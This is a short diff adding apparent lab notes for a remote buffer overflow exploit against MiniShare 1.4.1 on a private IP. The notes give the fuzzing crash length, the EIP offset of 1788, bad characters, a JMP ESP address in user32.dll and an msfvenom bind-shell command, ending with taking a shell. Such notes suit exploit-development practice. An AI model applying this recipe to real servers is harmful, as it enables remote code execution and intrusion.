@@ -1,0 +1,21 @@
+//Remote exploit
+
+IP : 192.168.43.156
+port 80
+PORT   STATE SERVICE VERSION
+80/tcp open  http    MiniShare http interface 1.4.1
+_____________________________________________________________________________
+
+Buffer 
+
+1. fuzzing buffer with "A" crashed happen at 1800
+2. finding offset (1800) 
+3. cehck EIP => 43366843
+4. Offset finding =>1788	
+5. Check offset and data to control EIP"A"* 1788 + "B" * 4  + "C" * 300
+6. Bad cahracter finding (\x00\x0d)
+7. Find JMP ESP (!mona find -s "\xff\xe4" -m user32.dll)
+8. 75FB94E3   FFE4             JMP ESP ==> \xe3\x94\xfb\x75
+9. making bind shell (msfvenom -p windows/shell_bind_tcp -f c -b "\x00\x0d")
+10. send final exploit
+11 taking shell
